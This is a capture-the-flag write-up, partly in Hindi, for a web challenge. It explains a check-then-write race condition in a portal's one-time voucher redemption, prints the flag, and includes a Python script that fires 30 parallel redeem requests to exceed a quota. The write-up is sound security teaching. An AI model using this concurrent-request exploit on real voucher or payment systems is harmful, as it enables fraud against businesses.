# CTF Writeup: Web 2 — Customer Portal

- Challenge: Web 2
- Target: http://web.secleaf.xyz:8880/
- Category: Web / Race Condition (TOCTOU)
- Flag: SecLeaf{ch3ck_f1r5t_wr1t3_l4t3r_b00m}

---

## 1. Description & Vulnerability Analysis
Portal par login karne ke baad conditions di gayi thi:
- Account quota: 100 litres
- Goodwill voucher: 50 litres (claimable only once)
- Reserve Valve unlock requirement: 1,000 litres

Flag ke naming convention se clear hint milti hai:
> `ch3ck_f1r5t_wr1t3_l4t3r_b00m` -> **Check First, Write Later** (Time-of-Check to Time-of-Use / Race Condition)

Backend voucher redemption process me vulnerability thi:
1. Server pehle check karta hai ki voucher already used hai ya nahi (Check).
2. Phir quota add karta hai aur database me voucher ko `used` mark karta hai (Write).
3. Check aur Write ke beech ke time gap me multiple concurrent requests bhej kar voucher ko multiple times redeem kiya ja sakta hai (Race Condition).

---

## 2. Exploitation (Python Script)
Concurrent threading use karke voucher redeem endpoint par simultaneously requests bheji, taaki balance 1,000 litres cross ho jaye aur Reserve Valve open ho sake:

```python
import requests
import concurrent.futures

BASE_URL = "[http://web.secleaf.xyz:8880](http://web.secleaf.xyz:8880)"
session = requests.Session()

# 1. Register ya Login karke session create kiya
# session.post(f"{BASE_URL}/login", data={"username": "test", "password": "password"})

def redeem_voucher():
    return session.post(f"{BASE_URL}/voucher/redeem", data={"voucher": "GOODWILL50"})

# 2. Race condition exploit karne ke liye parallel threads bheje
print("[*] Triggering race condition on voucher redemption...")
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    futures = [executor.submit(redeem_voucher) for _ in range(30)]
    for future in concurrent.futures.as_completed(futures):
        pass

# 3. Quota badhne ke baad Reserve Valve open kiya
response = session.post(f"{BASE_URL}/valve/open")
print(response.text)
